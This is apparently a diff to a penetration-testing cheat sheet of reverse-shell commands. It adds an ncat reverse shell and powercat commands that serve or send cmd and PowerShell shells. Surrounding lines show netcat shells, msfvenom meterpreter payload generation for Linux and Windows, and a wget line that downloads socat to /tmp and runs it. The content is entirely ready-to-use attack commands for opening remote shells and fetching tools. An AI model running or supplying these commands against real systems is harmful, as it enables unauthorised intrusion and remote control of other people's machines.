@@ -4,6 +4,7 @@ reverse shells
 UNIX
 NETCAT
 nc <attacker_ip> <port> -e /bin/bash
+ncat <attacker_ip> <port> -e /bin/bash
 BINARY
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 
@@ -82,6 +83,15 @@ wget -q http://10.10.14.16/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat 
 
 
 WINDOWS
+POWERCAT
+powercat -l -p 443 -e cmd
+	-serve a cmd Shell
+powercat -c 10.1.1.1 -p 443 -e cmd
+	-send a cmd Shell
+powercat -l -p 443 -ep
+	-serve a shell which executes powershell commands
+powercat -c 111.11.1.11 -p 445 -e cmd -g
+	-generate a reverse tcp payload which connects back
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
 BINARY
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe	
